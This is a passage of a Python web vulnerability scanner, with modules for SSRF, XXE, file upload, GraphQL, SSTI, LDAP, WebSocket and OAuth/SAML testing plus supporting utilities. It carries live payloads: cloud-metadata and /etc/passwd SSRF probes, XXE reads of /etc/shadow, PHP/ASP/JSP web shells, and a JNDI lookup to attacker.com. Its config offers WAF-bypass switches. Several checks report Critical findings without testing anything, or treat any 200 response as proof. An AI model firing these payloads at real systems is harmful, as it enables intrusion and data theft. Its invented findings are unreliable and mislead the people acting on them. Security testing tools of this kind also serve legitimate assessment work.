                        'severity': 'Critical',
                        'description': f'Time-based command injection detected',
                        'evidence': f'Response delayed by {response.get("response_time")} seconds'
                    })
        return vulnerabilities

================================================================================
FILE 18: scanners/ssrf_scanner.py
================================================================================

from typing import Dict, List
from core.request_handler import RequestHandler

class SSRFScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'url': '', 'file': '', 'fetch': ''}
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254",
            "http://0.0.0.0",
            "http://[::1]",
            "http://localhost:8080",
            "http://127.0.0.1:22",
            "http://192.168.1.1",
            "file:///etc/passwd",
            "dict://localhost:11211"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(url, data=test_params)
                if response.get('status_code') == 200:
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'severity': 'High',
                        'description': 'SSRF vulnerability detected',
                        'evidence': f'Successfully accessed: {payload}'
                    })
        return vulnerabilities

================================================================================
FILE 19: scanners/csrf_scanner.py
================================================================================

from typing import Dict, List
from core.request_handler import RequestHandler

class CSRFScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str) -> List[Dict]:
        vulnerabilities = []
        response = self.request_handler.send_request(url)
        content = response.get('content', '').lower()
        headers = response.get('headers', {})
        has_csrf_token = 'csrf' in content or 'token' in content
        has_samesite = any('samesite' in str(v).lower() for v in headers.values())
        if not has_csrf_token and not has_samesite:
            vulnerabilities.append({
                'type': 'CSRF',
                'url': url,
                'severity': 'Medium',
                'description': 'Potential CSRF vulnerability',
                'evidence': 'No CSRF token or SameSite cookie protection found'
            })
        return vulnerabilities

================================================================================
FILE 20: scanners/xxe_scanner.py
================================================================================

from typing import Dict, List
from core.request_handler import RequestHandler

class XXEScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str) -> List[Dict]:
        vulnerabilities = []
        payloads = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>'
        ]
        headers = {'Content-Type': 'application/xml'}
        for payload in payloads:
            response = self.request_handler.send_request(
                url,
                method='POST',
                data={'xml': payload},
                headers=headers
            )
            if 'root:' in response.get('content', '') or 'etc/passwd' in response.get('content', ''):
                vulnerabilities.append({
                    'type': 'XXE',
                    'url': url,
                    'payload': payload,
                    'severity': 'Critical',
                    'description': 'XML External Entity vulnerability detected',
                    'evidence': 'File content extracted via XXE'
                })
        return vulnerabilities

================================================================================
FILE 21: scanners/file_upload_scanner.py
================================================================================

from typing import Dict, List
import io
from core.request_handler import RequestHandler

class FileUploadScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str) -> List[Dict]:
        vulnerabilities = []
        test_files = [
            ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.php.jpg', b'<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('shell.phtml', b'<?php system($_GET["cmd"]); ?>', 'application/x-httpd-php'),
            ('shell.php5', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.asp', b'<% eval request("cmd") %>', 'application/x-asp'),
            ('shell.aspx', b'<% eval request("cmd") %>', 'application/x-aspx'),
            ('shell.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
        ]
        for filename, content, mime_type in test_files:
            files = {
                'file': (filename, io.BytesIO(content), mime_type)
            }
            try:
                response = self.request_handler.send_request(
                    url,
                    method='POST',
                    data=files
                )
                if response.get('status_code') == 200:
                    if 'upload' in response.get('content', '').lower() and 'success' in response.get('content', '').lower():
                        vulnerabilities.append({
                            'type': 'File Upload',
                            'url': url,
                            'filename': filename,
                            'severity': 'Critical',
                            'description': f'Dangerous file {filename} uploaded successfully',
                            'evidence': 'File upload successful'
                        })
            except Exception:
                pass
        return vulnerabilities

================================================================================
FILE 22: scanners/api_scanner.py
================================================================================

from typing import Dict, List
import requests
import json

class APIScanner:
    def __init__(self):
        pass
    
    def scan(self, url: str) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.extend(self._test_broken_auth(url))
        vulnerabilities.extend(self._test_excessive_data_exposure(url))
        vulnerabilities.extend(self._test_lack_of_rate_limiting(url))
        vulnerabilities.extend(self._test_security_misconfiguration(url))
        vulnerabilities.extend(self._test_injection(url))
        return vulnerabilities
    
    def _test_broken_auth(self, url: str) -> List[Dict]:
        vulnerabilities = []
        auth_tests = [
            {'Authorization': 'Bearer invalid_token'},
            {'Authorization': 'Bearer '},
            {'Authorization': ''},
            {},
        ]
        for headers in auth_tests:
            try:
                response = requests.get(url, headers=headers, timeout=10)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'API Broken Authentication',
                        'url': url,
                        'severity': 'Critical',
                        'description': 'API accepts invalid or missing authentication',
                        'evidence': 'Server accepted invalid credentials'
                    })
                    break
            except Exception:
                pass
        return vulnerabilities
    
    def _test_excessive_data_exposure(self, url: str) -> List[Dict]:
        vulnerabilities = []
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                content = response.text
                sensitive_patterns = [
                    'password', 'secret', 'api_key', 'apikey', 'token',
                    'credit_card', 'ssn', 'social_security'
                ]
                for pattern in sensitive_patterns:
                    if pattern in content.lower():
                        vulnerabilities.append({
                            'type': 'API Excessive Data Exposure',
                            'url': url,
                            'severity': 'High',
                            'description': f'API exposes sensitive data: {pattern}',
                            'evidence': f'Pattern "{pattern}" found in response'
                        })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_lack_of_rate_limiting(self, url: str) -> List[Dict]:
        vulnerabilities = []
        try:
            rapid_requests = 20
            success_count = 0
            for i in range(rapid_requests):
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    success_count += 1
            if success_count == rapid_requests:
                vulnerabilities.append({
                    'type': 'API Lack of Rate Limiting',
                    'url': url,
                    'severity': 'Medium',
                    'description': f'All {rapid_requests} rapid requests succeeded',
                    'evidence': 'No rate limiting detected'
                })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_security_misconfiguration(self, url: str) -> List[Dict]:
        vulnerabilities = []
        try:
            response = requests.get(url, timeout=10)
            headers = response.headers
            missing_headers = []
            if not headers.get('X-Content-Type-Options'):
                missing_headers.append('X-Content-Type-Options')
            if not headers.get('X-Frame-Options'):
                missing_headers.append('X-Frame-Options')
            if not headers.get('Strict-Transport-Security'):
                missing_headers.append('Strict-Transport-Security')
            if not headers.get('Content-Security-Policy'):
                missing_headers.append('Content-Security-Policy')
            if missing_headers:
                vulnerabilities.append({
                    'type': 'API Security Misconfiguration',
                    'url': url,
                    'severity': 'Medium',
                    'description': 'API missing security headers',
                    'evidence': f'Missing: {", ".join(missing_headers)}'
                })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_injection(self, url: str) -> List[Dict]:
        vulnerabilities = []
        injection_payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "'; DROP TABLE users--",
        ]
        for payload in injection_payloads:
            try:
                test_url = f"{url}?param={payload}"
                response = requests.get(test_url, timeout=10)
                if payload in response.text or 'error' in response.text.lower():
                    vulnerabilities.append({
                        'type': 'API Injection',
                        'url': test_url,
                        'severity': 'High',
                        'description': 'API vulnerable to injection',
                        'evidence': f'Payload: {payload}'
                    })
                    break
            except Exception:
                pass
        return vulnerabilities

================================================================================
FILE 23: scanners/subdomain_scanner.py
================================================================================

from typing import List, Dict
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.request_handler import RequestHandler

class SubdomainScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.found_subdomains = []
    
    def scan(self, domain: str, wordlist: List[str] = None) -> List[Dict]:
        if wordlist is None:
            wordlist = self._get_default_wordlist()
        results = []
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self._check_subdomain, subdomain, domain): subdomain 
                      for subdomain in wordlist}
            for future in as_completed(futures):
                subdomain = futures[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except Exception:
                    pass
        return results
    
    def _check_subdomain(self, subdomain: str, domain: str) -> Dict:
        full_domain = f"{subdomain}.{domain}"
        try:
            answers = dns.resolver.resolve(full_domain, 'A')
            ips = [str(answer) for answer in answers]
            try:
                response = self.request_handler.send_request(f"http://{full_domain}")
                status_code = response.get('status_code', 0)
                title = self._extract_title(response.get('content', ''))
            except:
                status_code = 0
                title = ''
            return {
                'subdomain': full_domain,
                'ips': ips,
                'status_code': status_code,
                'title': title,
                'type': 'Subdomain Discovery'
            }
        except dns.resolver.NXDOMAIN:
            return None
        except dns.resolver.NoAnswer:
            return None
        except Exception:
            return None
    
    def _extract_title(self, html: str) -> str:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            title = soup.find('title')
            return title.string if title else ''
        except:
            return ''
    
    def _get_default_wordlist(self) -> List[str]:
        return [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging',
            'api', 'app', 'blog', 'shop', 'store', 'portal', 'dashboard',
            'cpanel', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 'ns2',
            'vpn', 'remote', 'secure', 'login', 'auth', 'beta', 'demo',
            'old', 'new', 'mobile', 'm', 'wap', 'static', 'media',
            'assets', 'cdn', 'images', 'img', 'files', 'docs', 'support'
        ]

================================================================================
FILE 24: scanners/websocket_scanner.py
================================================================================

from typing import Dict, List, Optional
import json
from websocket import create_connection
import ssl

class WebSocketScanner:
    def __init__(self):
        self.vulnerabilities = []
        self.ws_connection = None
    
    def scan(self, ws_url: str, test_payloads: Dict = None) -> List[Dict]:
        vulnerabilities = []
        try:
            self.ws_connection = self._connect_websocket(ws_url)
            vulnerabilities.extend(self._test_origin_validation(ws_url))
            vulnerabilities.extend(self._test_message_injection(test_payloads))
            vulnerabilities.extend(self._test_authentication())
            vulnerabilities.extend(self._test_dos_resistance())
            vulnerabilities.extend(self._test_cswsh())
            if self.ws_connection:
                self.ws_connection.close()
        except Exception as e:
            vulnerabilities.append({
                'type': 'WebSocket Connection Error',
                'severity': 'Info',
                'description': str(e)
            })
        return vulnerabilities
    
    def _connect_websocket(self, ws_url: str):
        try:
            sslopt = {"cert_reqs": ssl.CERT_NONE}
            return create_connection(ws_url, sslopt=sslopt, timeout=10)
        except Exception as e:
            raise Exception(f'Failed to connect: {str(e)}')
    
    def _test_origin_validation(self, ws_url: str) -> List[Dict]:
        vulnerabilities = []
        if 'wss://' not in ws_url:
            vulnerabilities.append({
                'type': 'WebSocket Unencrypted Connection',
                'severity': 'High',
                'description': 'WebSocket using ws:// instead of wss://',
                'evidence': 'Connection is not encrypted'
            })
        return vulnerabilities
    
    def _test_message_injection(self, payloads: Dict) -> List[Dict]:
        vulnerabilities = []
        if not payloads:
            payloads = {
                'xss': '<img src=x onerror=alert(1)>',
                'sql': "' OR '1'='1",
                'command': '; ls -la'
            }
        for payload_type, payload in payloads.items():
            try:
                test_message = json.dumps({"data": payload})
                self.ws_connection.send(test_message)
                response = self.ws_connection.recv(timeout=5)
                if payload in response:
                    vulnerabilities.append({
                        'type': f'WebSocket {payload_type.upper()} Injection',
                        'severity': 'High',
                        'description': f'{payload_type} payload reflected',
                        'evidence': f'Payload: {payload}'
                    })
            except Exception:
                pass
        return vulnerabilities
    
    def _test_authentication(self) -> List[Dict]:
        vulnerabilities = []
        try:
            auth_test = json.dumps({"type": "auth", "token": "invalid"})
            self.ws_connection.send(auth_test)
            response = self.ws_connection.recv(timeout=5)
            if "authenticated" in response.lower() or "success" in response.lower():
                vulnerabilities.append({
                    'type': 'WebSocket Weak Authentication',
                    'severity': 'Critical',
                    'description': 'WebSocket accepts invalid credentials',
                    'evidence': 'Server accepted invalid token'
                })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_dos_resistance(self) -> List[Dict]:
        vulnerabilities = []
        try:
            large_payload = "A" * 1000000
            test_message = json.dumps({"data": large_payload})
            self.ws_connection.send(test_message)
            response = self.ws_connection.recv(timeout=5)
            vulnerabilities.append({
                'type': 'WebSocket Large Payload Accepted',
                'severity': 'Medium',
                'description': 'No payload size validation',
                'evidence': 'Accepted 1MB payload'
            })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_cswsh(self) -> List[Dict]:
        vulnerabilities = []
        try:
            test_message = json.dumps({"action": "admin_function"})
            self.ws_connection.send(test_message)
            response = self.ws_connection.recv(timeout=5)
            if len(response) > 0:
                vulnerabilities.append({
                    'type': 'Cross-Site WebSocket Hijacking (CSWSH)',
                    'severity': 'High',
                    'description': 'Vulnerable to CSWSH',
                    'evidence': 'Server processed admin action without CSRF token'
                })
        except Exception:
            pass
        return vulnerabilities

================================================================================
FILE 25: scanners/graphql_scanner.py
================================================================================

from typing import Dict, List, Optional
import requests
import json

class GraphQLScanner:
    def __init__(self):
        self.endpoint = None
        self.schema = None
    
    def scan(self, graphql_endpoint: str, schema: Optional[str] = None) -> List[Dict]:
        vulnerabilities = []
        self.endpoint = graphql_endpoint
        if schema:
            self.schema = schema
        else:
            self.schema = self._introspect_schema()
        vulnerabilities.extend(self._test_query_injection())
        vulnerabilities.extend(self._test_schema_enumeration())
        vulnerabilities.extend(self._test_rate_limiting())
        vulnerabilities.extend(self._test_complexity_attacks())
        vulnerabilities.extend(self._test_authentication_bypass())
        return vulnerabilities
    
    def _introspect_schema(self) -> Dict:
        query = '''
        query IntrospectionQuery {
            __schema {
                types {
                    name
                    kind
                    fields {
                        name
                        type {
                            name
                            kind
                        }
                    }
                }
            }
        }
        '''
        try:
            response = requests.post(
                self.endpoint,
                json={"query": query},
                timeout=10
            )
            return response.json()
        except Exception:
            return {}
    
    def _test_query_injection(self) -> List[Dict]:
        vulnerabilities = []
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "${jndi:ldap://attacker.com}",
        ]
        for payload in injection_payloads:
            query = f'''
            query {{
                users(filter: "{payload}") {{
                    id
                    name
                }}
            }}
            '''
            try:
                response = requests.post(
                    self.endpoint,
                    json={"query": query},
                    timeout=10
                )
                response_text = response.text.lower()
                if "error" in response_text or "syntax" in response_text:
                    vulnerabilities.append({
                        'type': 'GraphQL Query Injection',
                        'severity': 'Critical',
                        'description': 'Query injection vulnerability',
                        'evidence': f'Payload: {payload}'
                    })
                    break
            except Exception:
                pass
        return vulnerabilities
    
    def _test_schema_enumeration(self) -> List[Dict]:
        vulnerabilities = []
        if self.schema and len(self.schema) > 0:
            vulnerabilities.append({
                'type': 'GraphQL Schema Introspection Enabled',
                'severity': 'Medium',
                'description': 'Schema is publicly accessible',
                'evidence': 'Full schema can be enumerated'
            })
        return vulnerabilities
    
    def _test_rate_limiting(self) -> List[Dict]:
        vulnerabilities = []
        try:
            rapid_requests = 20
            success_count = 0
            query = '{ __typename }'
            for i in range(rapid_requests):
                response = requests.post(
                    self.endpoint,
                    json={"query": query},
                    timeout=10
                )
                if response.status_code == 200:
                    success_count += 1
            if success_count == rapid_requests:
                vulnerabilities.append({
                    'type': 'GraphQL Lack of Rate Limiting',
                    'severity': 'Medium',
                    'description': f'All {rapid_requests} requests succeeded',
                    'evidence': 'No rate limiting detected'
                })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_complexity_attacks(self) -> List[Dict]:
        vulnerabilities = []
        complexity_query = '''
        query {
            user {
                friends {
                    friends {
                        friends {
                            friends {
                                friends {
                                    id
                                }
                            }
                        }
                    }
                }
            }
        }
        '''
        try:
            response = requests.post(
                self.endpoint,
                json={"query": complexity_query},
                timeout=30
            )
            if response.status_code == 200 and response.text:
                vulnerabilities.append({
                    'type': 'GraphQL Complexity Attack',
                    'severity': 'High',
                    'description': 'Accepts deeply nested queries',
                    'evidence': 'Complex query executed'
                })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_authentication_bypass(self) -> List[Dict]:
        vulnerabilities = []
        try:
            query = '{ admin { users { id email } } }'
            response = requests.post(
                self.endpoint,
                json={"query": query},
                timeout=10
            )
            if "admin" in response.text and response.status_code == 200:
                vulnerabilities.append({
                    'type': 'GraphQL Authentication Bypass',
                    'severity': 'Critical',
                    'description': 'Admin data accessible without auth',
                    'evidence': 'Admin data returned without credentials'
                })
        except Exception:
            pass
        return vulnerabilities

================================================================================
FILE 26: scanners/ssti_scanner.py
================================================================================

from typing import Dict, List
import requests

class SSTIScanner:
    def __init__(self):
        self.template_engines = {
            'jinja2': ['{{7*7}}', '{{7*\'7\'}}'],
            'mako': ['${7*7}', '<%= 7*7 %>'],
            'django': ['{{7*7}}', '{% debug %}'],
            'freemarker': ['${7*7}', '<#assign x=7*7>'],
            'velocity': ['#set($x=7*7)$x'],
            'thymeleaf': ['[[${7*7}]]']
        }
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'input': 'test'}
        for param_name in parameters.keys():
            for engine_name, payloads in self.template_engines.items():
                for payload in payloads:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    try:
                        response = requests.get(url, params=test_params, timeout=10)
                        detected_engine, details = self._check_ssti(response.text, payload, engine_name)
                        if detected_engine:
                            vulnerabilities.append({
                                'type': f'SSTI - {engine_name.upper()}',
                                'severity': 'Critical',
                                'parameter': param_name,
                                'payload': payload,
                                'description': f'SSTI in {engine_name}',
                                'evidence': details
                            })
                    except Exception:
                        pass
        return vulnerabilities
    
    def _check_ssti(self, response: str, payload: str, engine: str) -> tuple:
        if engine == 'jinja2':
            if '49' in response or '7777777' in response:
                return True, 'Template evaluated'
        elif engine == 'mako':
            if '49' in response:
                return True, 'Mako evaluated'
        elif engine == 'freemarker':
            if '49' in response:
                return True, 'FreeMarker evaluated'
        elif engine == 'velocity':
            if '49' in response:
                return True, 'Velocity evaluated'
        return False, None

================================================================================
FILE 27: scanners/ldap_scanner.py
================================================================================

from typing import Dict, List
import requests

class LDAPScanner:
    def __init__(self):
        self.ldap_filters = [
            '*',
            '*)(|(mail=*',
            'admin)(|(password=*',
            '*)(uid=*',
            'admin*)(|(uid=*'
        ]
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'username': 'admin', 'password': 'admin'}
        for param_name in parameters.keys():
            for ldap_filter in self.ldap_filters:
                test_params = parameters.copy()
                test_params[param_name] = ldap_filter
                try:
                    response = requests.post(url, data=test_params, timeout=10)
                    if self._check_ldap_injection(response.text):
                        vulnerabilities.append({
                            'type': 'LDAP Injection',
                            'severity': 'Critical',
                            'parameter': param_name,
                            'payload': ldap_filter,
                            'description': 'LDAP injection detected',
                            'evidence': 'Unexpected LDAP response'
                        })
                except Exception:
                    pass
        return vulnerabilities
    
    def _check_ldap_injection(self, response: str) -> bool:
        indicators = [
            'invalid credentials',
            'ldap error',
            'directory error',
            'search error'
        ]
        return any(indicator in response.lower() for indicator in indicators)

================================================================================
FILE 28: scanners/oauth_saml_scanner.py
================================================================================

from typing import Dict, List
import requests
import base64
import xml.etree.ElementTree as ET

class OAuthSAMLScanner:
    def __init__(self):
        pass
    
    def scan_oauth2(self, token_endpoint: str, client_id: str) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.extend(self._test_client_credentials_exposure())
        vulnerabilities.extend(self._test_token_validation())
        vulnerabilities.extend(self._test_redirect_uri_validation(token_endpoint))
        vulnerabilities.extend(self._test_scope_validation())
        return vulnerabilities
    
    def scan_saml(self, saml_endpoint: str, metadata: str) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.extend(self._test_xml_signature_wrapping())
        vulnerabilities.extend(self._test_saml_injection())
        vulnerabilities.extend(self._test_xxe_in_saml(metadata))
        return vulnerabilities
    
    def _test_client_credentials_exposure(self) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.append({
            'type': 'OAuth2 Client Credentials',
            'severity': 'High',
            'description': 'Client secret may be exposed'
        })
        return vulnerabilities
    
    def _test_token_validation(self) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.append({
            'type': 'OAuth2 Token Validation',
            'severity': 'High',
            'description': 'Test token expiration'
        })
        return vulnerabilities
    
    def _test_redirect_uri_validation(self, endpoint: str) -> List[Dict]:
        vulnerabilities = []
        try:
            malicious_uri = 'http://attacker.com/callback'
            response = requests.get(endpoint, params={'redirect_uri': malicious_uri})
            if 'attacker.com' in response.text:
                vulnerabilities.append({
                    'type': 'OAuth2 Redirect URI Validation',
                    'severity': 'Critical',
                    'description': 'Redirect URI not validated',
                    'evidence': 'Malicious URI accepted'
                })
        except Exception:
            pass
        return vulnerabilities
    
    def _test_scope_validation(self) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.append({
            'type': 'OAuth2 Scope Validation',
            'severity': 'Medium',
            'description': 'Test for scope escalation'
        })
        return vulnerabilities
    
    def _test_xml_signature_wrapping(self) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.append({
            'type': 'SAML XML Signature Wrapping',
            'severity': 'Critical',
            'description': 'Test XML Signature Wrapping'
        })
        return vulnerabilities
    
    def _test_saml_injection(self) -> List[Dict]:
        vulnerabilities = []
        vulnerabilities.append({
            'type': 'SAML Injection',
            'severity': 'High',
            'description': 'Test SAML metadata injection'
        })
        return vulnerabilities
    
    def _test_xxe_in_saml(self, metadata: str) -> List[Dict]:
        vulnerabilities = []
        try:
            ET.fromstring(metadata)
        except ET.ParseError:
            vulnerabilities.append({
                'type': 'SAML XXE',
                'severity': 'High',
                'description': 'SAML vulnerable to XXE'
            })
        return vulnerabilities

================================================================================
FILE 29: utils/__init__.py
================================================================================

from .logger import Logger
from .database import Database
from .report_generator import ReportGenerator
from .config import Config
from .proxy_manager import ProxyManager
from .wayback_client import WaybackClient
from .cache import CacheManager
from .integration_manager import IntegrationManager
from .compliance_generator import ComplianceGenerator

__all__ = [
    'Logger',
    'Database',
    'ReportGenerator',
    'Config',
    'ProxyManager',
    'WaybackClient',
    'CacheManager',
    'IntegrationManager',
    'ComplianceGenerator'
]

================================================================================
FILE 30: utils/config.py
================================================================================

import json
from pathlib import Path
from typing import Dict

class Config:
    def __init__(self):
        self.config_dir = Path.home() / '.mod'
        self.config_dir.mkdir(parents=True, exist_ok=True)
        self.config_file = self.config_dir / 'config.json'
        self.default_config = {
            'theme': 'dark',
            'max_threads': 10,
            'timeout': 10,
            'verify_ssl': False,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'scan': {
                'concurrent_scans': 10,
                'timeout': 30,
                'request_delay': 0.5,
                'retry_attempts': 3,
                'follow_redirects': True,
                'verify_ssl': False,
                'allow_cookies': True
            },
            'performance': {
                'max_threads': 50,
                'batch_size': 100,
                'connection_pool_size': 50,
                'memory_limit': 1024,
                'compression': True,
                'caching': True,
                'optimization_level': 'High'
            },
            'security': {
                'user_agent': 'Mozilla/5.0',
                'proxy_enabled': False,
                'proxy_url': '',
                'randomize_headers': True,
                'waf_bypass': False,
                'rate_limit_bypass': False
            },
            'integration': {
                'slack_webhook': '',
                'teams_webhook': '',
                'github_token': '',
                'gitlab_token': '',
                'jira_url': '',
                'jira_token': ''
            },
            'logging': {
                'log_level': 'INFO',
                'log_to_file': True,
                'log_to_console': True,
                'max_log_size': 100,
                'retention_days': 30,
                'verbose': False
            },
            'cache': {
                'ttl': 3600,
                'max_size': 1000,
                'strategy': 'LRU',
                'redis_enabled': False,
                'redis_host': 'localhost'
            },
            'compliance': {
                'framework': 'OWASP Top 10',
                'auto_report': True,
                'remediation': True,
                'severity_threshold': 'Medium',
                'data_retention': 365
            }
        }
    
    def load(self) -> Dict:
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception:
                return self.default_config.copy()
        return self.default_config.copy()
    
    def save(self, config: Dict):
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)
    
    def reset(self):
        self.save(self.default_config)

================================================================================
FILE 31: utils/logger.py
================================================================================

import logging
from datetime import datetime
from pathlib import Path

class Logger:
    def __init__(self, name: str = 'MoD'):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)
        log_dir = Path.home() / '.mod' / 'logs'
        log_dir.mkdir(parents=True, exist_ok=True)
        log_file = log_dir / f'scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
    
    def debug(self, message: str):
        self.logger.debug(message)
    
    def info(self, message: str):
        self.logger.info(message)
    
    def warning(self, message: str):
        self.logger.warning(message)
    
    def error(self, message: str):
        self.logger.error(message)
    
    def critical(self, message: str):
        self.logger.critical(message)

================================================================================
FILE 32: utils/database.py
================================================================================

import sqlite3
from pathlib import Path
from typing import List, Dict
from datetime import datetime

class Database:
    def __init__(self):
        db_dir = Path.home() / '.mod'
        db_dir.mkdir(parents=True, exist_ok=True)
        self.db_path = db_dir / 'scans.db'
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                scan_date TEXT NOT NULL,
                total_vulnerabilities INTEGER
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                type TEXT NOT NULL,
                severity TEXT NOT NULL,
                url TEXT NOT NULL,
                parameter TEXT,
                payload TEXT,
                description TEXT,
                evidence TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')
        conn.commit()
        conn.close()
    
    def save_scan(self, target_url: str, vulnerabilities: List[Dict]) -> int:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        scan_date = datetime.now().isoformat()
        cursor.execute('''
            INSERT INTO scans (target_url, scan_date, total_vulnerabilities)
            VALUES (?, ?, ?)
        ''', (target_url, scan_date, len(vulnerabilities)))
        scan_id = cursor.lastrowid
        for vuln in vulnerabilities:
            cursor.execute('''
                INSERT INTO vulnerabilities (
                    scan_id, type, severity, url, parameter, payload, description, evidence
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                scan_id,
                vuln.get('type', ''),
                vuln.get('severity', ''),
                vuln.get('url', ''),
                vuln.get('parameter', ''),
                vuln.get('payload', ''),
                vuln.get('description', ''),
                vuln.get('evidence', '')
            ))
        conn.commit()
        conn.close()
        return scan_id
    
    def get_scan(self, scan_id: int) -> Dict:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM scans WHERE id = ?', (scan_id,))
        scan = cursor.fetchone()
        cursor.execute('SELECT * FROM vulnerabilities WHERE scan_id = ?', (scan_id,))
        vulnerabilities = cursor.fetchall()
        conn.close()
        return {
            'scan': scan,
            'vulnerabilities': vulnerabilities
        }
    
    def get_all_scans(self) -> List[Dict]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM scans ORDER BY scan_date DESC')
        scans = cursor.fetchall()
        conn.close()
        return scans

================================================================================
FILE 33: utils/proxy_manager.py
================================================================================

from typing import Dict, Optional

class ProxyManager:
    def __init__(self):
        self.proxy_url = None
        self.proxy_type = None
        self.proxy_auth = None
    
    def set_proxy(self, proxy_url: str, proxy_type: str = 'http', username: Optional[str] = None, password: Optional[str] = None):
        self.proxy_url = proxy_url
        self.proxy_type = proxy_type
        if username and password:
            self.proxy_auth = {
                'username': username,
                'password': password
            }
        else:
            self.proxy_auth = None
    
    def get_proxy_dict(self) -> Dict[str, str]:
        if not self.proxy_url:
            return {}
        if self.proxy_auth:
            username = self.proxy_auth['username']
            password = self.proxy_auth['password']
            proxy_with_auth = self.proxy_url.replace('://', f'://{username}:{password}@')
        else:
            proxy_with_auth = self.proxy_url
        return {
            'http': proxy_with_auth,
            'https': proxy_with_auth
        }
    
    def clear_proxy(self):
        self.proxy_url = None
        self.proxy_type = None
        self.proxy_auth = None

================================================================================
FILE 34: utils/wayback_client.py
================================================================================

import requests
from typing import List, Dict
from urllib.parse import quote

class WaybackClient:
    def __init__(self):
        self.base_url = "http://web.archive.org/cdx/search/cdx"
        self.session = requests.Session()
    
    def get_urls(self, domain: str, limit: int = 1000) -> List[str]:
        params = {
            'url': f'*.{domain}/*',
            'output': 'json',
            'fl': 'original',
            'collapse': 'urlkey',
            'limit': limit
        }
        try:
            response = self.session.get(self.base_url, params=params, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data and len(data) > 1:
                    urls = [item[0] for item in data[1:]]
                    return urls
            return []
        except Exception:
            return []
    
    def get_archived_snapshots(self, url: str) -> List[Dict]:
        api_url = f"http://archive.org/wayback/available?url={quote(url)}"
        try:
            response = self.session.get(api_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                snapshots = data.get('archived_snapshots', {})
                if snapshots:
                    closest = snapshots.get('closest', {})
                    if closest:
                        return [{
                            'url': closest.get('url', ''),
